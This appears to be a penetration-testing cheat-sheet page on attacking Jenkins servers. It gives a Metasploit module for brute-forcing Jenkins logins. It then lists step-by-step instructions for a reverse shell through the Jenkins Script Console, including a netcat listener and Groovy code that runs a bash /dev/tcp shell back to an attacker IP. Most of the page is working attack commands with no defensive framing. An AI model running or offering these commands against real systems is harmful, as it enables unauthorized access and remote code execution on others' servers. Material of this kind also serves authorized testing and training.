---
title: Jenkins
desc: Automate the parts of development.
tags: [Jenkins, PrivEsc]
alts: []
website:
render_with_liquid: false
---

## Login Bypass

```sh
# Brute force
msfconsole
msf > use auxiliary/scanner/http/jenkins_login
```

<br />

## Reverse Shell on Dashboard

```
1. In attacker's machine, run "nc -lvnp 4444" for listener.
2. In browser, access http://localhost:8080 and login.
3. Click "Manage Jenkins" and "Script Console".
4. Add the following commands.

--------------------------------------------------------
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/<Attacker_IP>/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
---------------------------------------------------------

5. Click "Run".
```